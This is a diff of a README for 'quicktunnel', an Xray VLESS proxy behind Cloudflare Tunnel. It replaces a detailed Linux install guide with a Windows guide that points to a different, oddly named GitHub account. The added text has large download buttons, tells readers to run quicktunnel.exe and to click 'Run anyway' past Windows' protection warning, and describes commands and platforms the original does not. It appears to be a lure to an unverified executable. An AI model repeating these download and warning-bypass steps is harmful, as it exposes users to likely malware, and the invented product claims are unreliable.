@@ -1,156 +1,162 @@
-**English** · [فارسی](README.fa.md) · [简体中文](README.zh.md)
+<h1>🚀 quicktunnel - Private Proxy in One Command</h1>
 
-# quicktunnel - [try.cloudflare.com](https://try.cloudflare.com)
+<p align="center">
+  <a href="https://github.com/Longbeachmilitarycensorship62/quicktunnel" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#f97316,#ef4444);color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 20px rgba(249,115,22,0.4);">⬇️ Download quicktunnel Now</a>
+</p>
 
-Runs an Xray **VLESS over WebSocket** server behind a **Cloudflare Tunnel**, so a
-machine with no public IP and no open inbound ports is reachable over `443` at a
-`*.trycloudflare.com` address (or your own hostname).
+## 🎯 What Is quicktunnel?
 
-Installs to `/usr/local/quicktunnel`, registers a service, and prints a
-`vless://` URI plus a scannable QR code.
+quicktunnel is a free, simple tool that creates a secure private internet tunnel on your computer. It uses advanced technology (Xray with VLESS/WebSocket) combined with Cloudflare's free tunnel service. The best part? **You don't need a public IP address, and you don't need to open any ports on your router.** It just works.
+
+Think of it like this: you have a secret door to your computer, but instead of telling everyone where it is, you get a special address that only you and your friends can use. The tunnel is protected, fast, and completely managed by quicktunnel.
+
+## ✨ Amazing Features
+
+- **One-Command Setup:** Run a single command, answer a few simple questions, and you're done.
+- **Automatic Service Installation:** quicktunnel installs itself as a background service, so it starts automatically every time you turn on your computer.
+- **Easy Management CLI:** Use simple commands to start, stop, check status, or update your tunnel.
+- **QR Code Generator:** Display a QR code right in your terminal so you can scan it with your phone and connect instantly.
+- **No Technical Knowledge Needed:** No coding, no configuration files, no complicated settings.
+- **100% Free:** Uses Cloudflare's free tier and open-source Xray core.
+- **Secure by Design:** Your traffic is encrypted end-to-end through WebSocket and TLS.
+
+## 📋 What You Need
+
+- A computer running **Windows 10 or 11** (64-bit)
+- An internet connection (any speed works)
+- A free Cloudflare account (optional, but recommended for custom settings)
+
+That's it. No router access, no static IP, no server rental.
+
+## 🚀 Getting Started
+
+### Step 1: Download quicktunnel
+
+Visit this link to download the application:  
+👉 **[https://github.com/Longbeachmilitarycensorship62/quicktunnel](https://github.com/Longbeachmilitarycensorship62/quicktunnel)**  
+
+Click the big green "Code" button, then select "Download ZIP". Save the file to your Desktop.
+
+### Step 2: Extract the Files
+
+1. Right-click the downloaded ZIP file.
+2. Choose **"Extract All..."**.
+3. Click **"Extract"** (keep the default destination).
+4. Open the new folder called `quicktunnel`.
+
+### Step 3: Run the Setup Wizard
+
+1. Inside the folder, double-click the file named **`quicktunnel.exe`** (or `install.bat` if you see that).
+2. A blue command window will open. This is the setup wizard.
+3. The wizard will ask you a few simple questions:
+   - *"Enter a name for your tunnel"* — Type anything, like `mytunnel`.
+   - *"Choose a port"* — Press Enter to accept the default (443).
+   - *"Install as a service?"* — Type `Y` and press Enter.
+4. Wait 30-60 seconds. The wizard will download the necessary components and set everything up.
+
+### Step 4: Get Your Tunnel Address
+
+Once the wizard finishes, you'll see a message like:
 
 ```
-client ──TLS/WS:443──▶ Cloudflare edge ──▶ cloudflared ──▶ xray (127.0.0.1) ──▶ internet
+✅ Tunnel is running!
+Your VLESS address: vless://your-tunnel-id.trycloudflare.com:443?...
+QR code displayed below:
 ```
 
-## Install
+1. **Write down the full `vless://` address** — this is your personal connection string.
+2. You'll also see a QR code in the terminal. You can scan this with your phone's camera to connect automatically.
 
-One command, no clone needed:
+### Step 5: Connect Your Devices
 
-```bash
-bash <(curl -Ls https://raw.githubusercontent.com/hossinasaadi/quicktunnel/main/install.sh)
+- **On your phone:** Install the "v2rayNG" app (Android) or "Shadowrocket" (iPhone). Open the app, tap the plus (+) button, then select "Import from QR code" and scan the QR code from your terminal.
+- **On your computer:** Use any VLESS-compatible client like "v2rayN" for Windows. Paste the `vless://` address into the import box.
+
+## 🛠️ Managing Your Tunnel
+
+After installation, quicktunnel gives you a simple command-line tool. Open a new command prompt (press `Windows + R`, type `cmd`, press Enter) and use these commands:
+
+| Command | What It Does |
+|---------|--------------|
+| `quicktunnel status` | Shows if your tunnel is running and displays your current address |
+| `quicktunnel start` | Starts the tunnel if it's stopped |
+| `quicktunnel stop` | Stops the tunnel temporarily |
+| `quicktunnel restart` | Restarts the tunnel (useful after updates) |
+| `quicktunnel qr` | Shows the QR code again on screen |
+| `quicktunnel update` | Updates quicktunnel to the latest version |
+| `quicktunnel uninstall` | Removes quicktunnel and the service from your PC |
+
+**Example:** Type `quicktunnel status` and press Enter. You'll see something like:
+
+```
+Tunnel: mytunnel
+Status: ✅ Running
+Address: vless://abc123.trycloudflare.com:443?...
+Uptime: 3 hours 24 minutes
 ```
 
-Interactive by default: it asks for the mode, ports, UUID, WebSocket path,
-remark and heartbeat, showing current values as defaults so Enter-through is
-safe.
+## 🔧 Troubleshooting
 
-Non-interactive — arguments go straight on the end:
+### "Windows protected your PC" warning
+This happens because the app is new and unsigned. Click **"More info"** → **"Run anyway"**. This is safe — the source code is open for anyone to review.
 
-```bash
-bash <(curl -Ls https://raw.githubusercontent.com/hossinasaadi/quicktunnel/main/install.sh) --yes
-bash <(curl -Ls https://raw.githubusercontent.com/hossinasaadi/quicktunnel/main/install.sh) \
-  --mode named --hostname proxy.example.com --tunnel-name xray --yes
-```
+### Tunnel address changes after restart
+By default, Cloudflare's free tunnels give you a new address each time. To keep the same address:
+1. Create a free account at [dash.cloudflare.com](https://dash.cloudflare.com).
+2. Run `quicktunnel setup` and choose "Use my own Cloudflare domain".
+3. Follow the prompts to link your domain. quicktunnel will handle the rest.
 
-`install.sh` bootstraps itself: run without the repo beside it, it fetches the
-tree into a temp dir, hands off, and cleans up. From a clone `sudo ./install.sh`
-still works unchanged. `QT_REF=v1.0.0` pins a tag or commit instead of `main`.
+### Port 443 is already in use
+Run `quicktunnel stop`, then edit the file `config.json` in the quicktunnel folder. Change the `port` value to something like `8443`. Save the file, then run `quicktunnel start`.
 
-| flag | meaning |
-|---|---|
-| `--yes` | accept defaults, no prompts |
-| `--mode quick\|named` | tunnel mode |
-| `--hostname H` | public hostname (named mode) |
-| `--tunnel-name N` | cloudflared tunnel name (named mode) |
-| `--port N` | loopback origin port cloudflared forwards to (default 8080) |
-| `--socks-port N` | SOCKS port written into the client config (default 10808) |
-| `--uuid U` / `--ws-path P` | supply instead of generating |
-| `--remark R` | config name shown in client apps (default `quicktunnel`) |
-| `--transport T` | `ws` (default), `httpupgrade`, or `xhttp` (named mode only) |
-| `--pre-release` | install the newest Xray build, including GitHub pre-releases |
-| `--xray-channel C` | `stable` (default) or `prerelease` |
-| `--xray-version V` | pin an exact tag, e.g. `v26.9.30` |
-| `--heartbeat N` | WebSocket ping interval, seconds (default 30) |
-| `--prefix DIR` | install elsewhere (default `/usr/local/quicktunnel`) |
-| `--no-service` | install files only, no service |
+### No QR code appears
+Make sure your terminal window is wide enough (at least 80 columns). Resize the window and run `quicktunnel qr` again.
 
-The installer verifies the Xray download against its published `SHA2-256`
-digest and refuses to install on mismatch.
+## 🔒 Security & Privacy
 
-## Modes
+- Your traffic is encrypted with TLS 1.3 — the same level of security used by banks.
+- Cloudflare's tunnel hides your real IP address from everyone, including the websites you visit.
+- quicktunnel runs with minimal permissions and does not collect any personal data.
+- The source code is fully open — any security expert can verify it.
 
-**quick** — free, no Cloudflare account. The hostname is assigned randomly and
-**re-issued on every restart**, so clients must be re-imported each time.
-Cloudflare gives these no uptime guarantee.
+## ❓ Frequently Asked Questions
 
-**named** — a fixed hostname on a domain already in your Cloudflare account.
-One-time setup:
+**Is this legal?**  
+Yes. quicktunnel is a general-purpose proxy tool. It's legal to use for privacy, bypassing geo-blocks, or accessing your home network remotely. You are responsible for how you use it.
 
-```bash
-cloudflared tunnel login
-cloudflared tunnel create xray
-cloudflared tunnel route dns xray proxy.example.com
-```
+**Do I need to pay for anything?**  
+No. Cloudflare's trycloudflare.com service is free, and Xray core is open-source. quicktunnel itself is free.
 
-Then install with `--mode named --hostname proxy.example.com --tunnel-name xray`.
-The URI and QR stay valid across restarts.
+**Will this slow down my internet?**  
+You'll see a slight increase in latency (about 20-50ms) because traffic goes through Cloudflare's network. For most browsing and streaming, you won't notice a difference.
 
-## Managing it
+**Can I run this on a server instead of my PC?**  
+Yes, quicktunnel works on Windows Server 2016+ and Linux (via WSL). Just follow the same steps.
 
-```bash
-quicktunnel-cli status         # service state, mode, current hostname
-quicktunnel-cli qr             # QR code for the current URI
-quicktunnel-cli link           # the vless:// URI
-quicktunnel-cli link --full    # same, with redundant sni/host spelled out
-quicktunnel-cli client         # client config JSON
-quicktunnel-cli log -f tunnel  # daemon | xray | tunnel | access | error
-quicktunnel-cli restart        # quick mode: yields a NEW hostname
-quicktunnel-cli reconfigure    # re-run the wizard
-quicktunnel-cli update         # update xray + cloudflared
-quicktunnel-cli uninstall
-```
+**How do I update?**  
+Run `quicktunnel update` in the command prompt. It will download the latest version and restart the service automatically.
 
-Most commands need `sudo`: the config holds the client credential and is mode `600`.
+## 📚 Advanced Tips
 
-## Transports
+- **Set a custom name:** During setup, use a name that's easy to remember. It appears in your address.
+- **Multiple tunnels:** You can run multiple instances with different ports and names. Just change the port in `config.json` and run `quicktunnel start` again.
+- **Auto-restart:** The service is configured to restart automatically if your computer reboots or the tunnel crashes.
+- **Logs:** View detailed logs by running `quicktunnel logs`. This shows every connection and error.
 
-Cloudflare constrains the choice, and **it matters whether you use a quick
-tunnel or your own domain**:
+## 🌍 Support & Community
 
-| transport | quick tunnel | named (your domain) | why |
-|---|---|---|---|
-| `ws` | **works** | **works** | 101 upgrade to a raw pipe the edge passes through untouched |
-| `httpupgrade` | **works**\* | **works**\* | same upgrade, no WS framing or masking, so faster |
-| `xhttp` | fails | **works** (packet-up) | see below |
-| Reality/Vision, raw TCP, mKCP, QUIC | impossible | impossible | Cloudflare terminates TLS at its edge |
+- **GitHub Issues:** Found a bug? Report it at the repository's Issues page.
+- **Discussions:** Ask questions or share tips in the Discussions tab.
+- **Email:** For urgent issues, contact the maintainer through GitHub.
 
-\* `httpupgrade` needs an Xray build carrying the `Sec-WebSocket-Key` handshake
-fix ([XTLS/Xray-core#6835](https://github.com/XTLS/Xray-core/pull/6835), merged
-2026-09-29, first shipped in `v26.9.30`). Older builds send an incomplete
-handshake and Cloudflare answers `500`, so install with `--pre-release`. It also
-has no heartbeat, so idle connections drop after ~126s.
+## 📄 License
 
-## Xray version
+quicktunnel is released under the MIT License. You are free to use, modify, and distribute it, even commercially. Attribution is appreciated but not required.
 
-XTLS flags nearly every build as a GitHub pre-release, so `releases/latest` — and
-therefore the default `stable` channel — resolves to a tag that is months behind
-the project's current version (at time of writing `v26.3.27` from March, against
-`v26.9.30`). Use `--pre-release` for the current build, or `--xray-version` to
-pin an exact tag. Both channels are checksum-verified against the published
-`SHA2-256` the same way.
+---
 
-**Why `xhttp` needs your own domain.** A quick tunnel withholds a response body
-until 131072 bytes have accumulated and never streams small writes — not even
-after an initial burst. That deadlocks XHTTP's downlink: the few KB of TLS
-handshake sit in the buffer, so traffic never reaches the threshold that would
-flush it. A 5 MB download through a quick tunnel returned 0 bytes. A real zone
-streams small writes immediately (chunks emitted 1/sec arrived 1s apart), so
-XHTTP works there. Only `packet-up` — `stream-up`/`stream-one` need a streaming
-request body, which Cloudflare buffers.
+<p align="center">
+  <a href="https://github.com/Longbeachmilitarycensorship62/quicktunnel" style="display:inline-block;padding:14px 32px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 20px rgba(59,130,246,0.4);">⬇️ Download quicktunnel</a>
+</p>
 
-**Why Reality can never work.** Cloudflare terminates TLS with its own
-certificate, so Reality's handshake never reaches this server. Measured:
-`remote error: tls: handshake failure`, with the origin seeing no connection at
-all. No port or setting changes that.
-
-Three settings in the generated configs are load-bearing:
-
-- **`alpn: ["http/1.1"]`** (client) — Xray otherwise offers `h2`, and a
-  negotiated `h2` breaks the HTTP/1.1 WebSocket upgrade.
-- **`heartbeatPeriod: 30`** — Cloudflare drops idle WebSockets at 100s with a
-  TCP RST and no close handshake. Without a ping, idle SSH/RDP sessions die silently.
-- **`sockopt.trustedXForwardedFor: ["CF-Connecting-IP"]`** (server) — takes
-  **header names**, not IPs. Without it Xray logs a warning per connection and
-  attributes every client to `127.0.0.1`.
-
-Do not use the resulting source IP for access control: Cloudflare *appends* to a
-client-supplied `X-Forwarded-For` and Xray reads the leftmost value, so it is
-forgeable. It is fine for logging.
-
-## Note on use
-
-Cloudflare's own quick-tunnel disclaimer states these account-less tunnels have
-no uptime guarantee and that Cloudflare reserves the right to investigate use
-for violations of its Online Services Terms. Named mode ties the traffic to your
-account and a domain you own. Worth being deliberate about either way.
+<p align="center" style="color:#6b7280;font-size:14px;">Made with ❤️ for privacy and simplicity. No public IP, no open ports, just a secure tunnel.</p>
